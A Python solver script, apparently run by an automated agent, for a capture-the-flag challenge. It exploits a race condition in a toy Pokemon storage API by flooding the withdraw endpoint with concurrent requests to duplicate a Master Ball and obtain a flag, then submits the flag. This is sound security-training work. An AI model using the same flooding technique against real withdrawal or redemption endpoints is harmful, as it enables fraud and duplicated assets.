"""
Bill's PC Solver
Exploits race condition in Pokemon storage API to duplicate Master Ball
"""
import requests
import threading
import time
from typing import Optional


class BillsPCSolver:
    """Solves the Bill's PC race condition challenge"""

    def __init__(self, agent):
        self.agent = agent
        self.base_url = f"http://{agent.target_ip}:{agent.target_port}"
        self.flag_found = None
        self.flag_lock = threading.Lock()

    def withdraw_item(self) -> Optional[str]:
        """
        Withdraw Master Ball from storage via POST /api/withdraw
        Returns flag if present in response
        """
        try:
            resp = requests.post(f"{self.base_url}/api/withdraw", timeout=5)
            print(f"Withdraw response: {resp.status_code} - {resp.text}", flush=True)

            if resp.status_code == 200:
                # Extract flag from JSON response
                try:
                    data = resp.json()
                    if 'flag' in data:
                        flag = data['flag']
                        with self.flag_lock:
                            if not self.flag_found:
                                self.flag_found = flag
                                print(f"FLAG FOUND: {flag}", flush=True)
                        return flag
                except:
                    pass

            return None
        except Exception as e:
            print(f"Withdraw failed: {e}", flush=True)
            return None

    def reset_storage(self) -> bool:
        """Reset storage via POST /api/reset"""
        try:
            resp = requests.post(f"{self.base_url}/api/reset", timeout=5)
            print(f"Reset response: {resp.status_code} - {resp.text}", flush=True)
            return resp.status_code == 200
        except Exception as e:
            print(f"Reset failed: {e}", flush=True)
            return False

    def race_condition_exploit(self, num_threads: int = 10) -> Optional[str]:
        """
        Exploit race condition by sending multiple withdraw requests simultaneously.
        Returns flag if found.
        """
        print(f"=== Race Condition Attack: {num_threads} parallel withdraws ===", flush=True)

        # Reset to clean state
        self.reset_storage()
        time.sleep(0.1)

        # Launch parallel withdraw requests
        threads = []
        flags = []

        def withdraw_thread():
            flag = self.withdraw_item()
            if flag:
                flags.append(flag)

        print(f"Launching {num_threads} concurrent withdraw requests...", flush=True)
        start = time.time()

        for _ in range(num_threads):
            t = threading.Thread(target=withdraw_thread)
            threads.append(t)
            t.start()

        # Wait for all threads with timeout
        for t in threads:
            t.join(timeout=10)  # 10s per thread max
            if t.is_alive():
                print(f"WARNING: Thread still alive after 10s timeout", flush=True)

        elapsed = time.time() - start
        print(f"All threads completed in {elapsed:.3f}s", flush=True)

        # Return first flag found
        return flags[0] if flags else None

    def solve(self) -> bool:
        """Main solving routine"""
        print("=== Bill's PC Solver ===", flush=True)

        found_flag = None

        # Escalate thread counts until the race wins and yields a flag.
        for num_threads in [10, 20, 50, 50, 100]:
            flag = self.race_condition_exploit(num_threads)
            if flag:
                found_flag = flag
                print(f"SUCCESS! Flag obtained: {flag}", flush=True)
                if self.agent.submit_flag(flag, self.agent.challenge_id):
                    print("=== Challenge Solved! ===", flush=True)
                    return True
                print("Flag found but submission rejected — will retry submission", flush=True)
                break  # We have the flag; stop racing and focus on submitting it.
            time.sleep(0.5)

        # If the race ever produced a flag, keep trying to submit it rather than
        # depending on re-winning the race. This is the whole point once a valid
        # flag exists: the exploit is proven, only the submit handoff remains.
        if found_flag:
            for attempt in range(1, 6):
                print(f"Submission retry {attempt}/5 for known flag...", flush=True)
                if self.agent.submit_flag(found_flag, self.agent.challenge_id):
                    print("=== Challenge Solved! ===", flush=True)
                    return True
                time.sleep(1.0)
            print("Flag found but all submission attempts were rejected — "
                  "see the Submit[...] response lines above for the exact error", flush=True)
            return False

        print("Failed to obtain flag via race condition", flush=True)
        return False
